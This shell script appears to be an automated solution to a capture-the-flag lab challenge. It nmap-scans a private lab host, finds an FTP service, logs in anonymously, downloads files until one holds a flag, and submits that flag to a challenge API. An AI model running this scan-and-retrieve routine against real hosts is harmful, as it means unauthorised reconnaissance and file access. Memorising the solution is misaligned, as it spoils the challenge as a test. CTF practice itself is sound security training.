#!/bin/sh
set -eu

TARGET=172.20.0.141
SCAN=$(nmap -sV -p- --open -T4 "$TARGET")
PORT=$(printf '%s\n' "$SCAN" | awk '$1 ~ /^[0-9]+\/tcp$/ && tolower($0) ~ /ftp/ { split($1, a, "/"); print a[1]; exit }')
if [ -z "$PORT" ]; then
  echo 'Could not identify the file-transfer service.' >&2
  exit 1
fi

FLAG=$(python3 - "$TARGET" "$PORT" <<'PY'
import ftplib
import sys

host, port = sys.argv[1], int(sys.argv[2])
ftp = ftplib.FTP()
ftp.connect(host, port, timeout=5)
ftp.login('anonymous', 'bbs@example.invalid')
for name in ftp.nlst():
    chunks = []
    try:
        ftp.retrbinary('RETR ' + name, chunks.append)
    except ftplib.all_errors:
        continue
    value = b''.join(chunks).decode().strip()
    if value:
        print(value)
        break
ftp.quit()
PY
)
if [ -z "$FLAG" ]; then
  echo 'The archive did not return a token.' >&2
  exit 1
fi

curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-df8dda\",\"task_id\":\"task1\",\"flag\":\"$FLAG\"}"
